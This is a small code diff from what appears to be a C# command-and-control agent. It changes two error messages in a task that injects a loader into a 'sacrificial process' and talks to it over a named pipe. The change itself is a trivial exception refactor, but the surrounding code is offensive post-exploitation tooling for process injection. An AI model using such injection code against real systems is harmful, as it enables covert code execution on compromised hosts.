@@ -219,7 +219,7 @@ namespace Tasks
 
                 if (!proc.Inject(exePEPic))
                 {
-                    throw new ExecuteAssemblyException($"Failed to inject loader into sacrificial process {info.Application}.");
+                    throw new Exception($"Failed to inject loader into sacrificial process {info.Application}.");
                 }
 
                 _agent.GetTaskManager().AddTaskResponseToQueue(
@@ -244,7 +244,7 @@ namespace Tasks
 
                 if (!client.Connect(10000))
                 {
-                    throw new ExecuteAssemblyException($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
+                    throw new Exception($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
                 }
 
                 IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
